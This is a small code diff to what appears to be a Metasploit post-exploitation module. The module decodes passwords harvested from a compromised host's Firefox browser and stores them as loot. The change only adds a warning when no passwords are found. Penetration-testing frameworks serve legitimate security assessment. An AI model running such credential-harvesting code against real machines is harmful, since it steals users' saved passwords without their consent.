@@ -37,8 +37,12 @@ class Metasploit3 < Msf::Post
           entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
         end
 
-        file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
-        print_good("Saved #{passwords.length} passwords to #{file}")
+        if passwords.length > 0
+          file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
+          print_good("Saved #{passwords.length} passwords to #{file}")
+        else
+          print_warning("No passwords were found in Firefox.")
+        end
       rescue JSON::ParserError => e
         print_warning(results)
       end
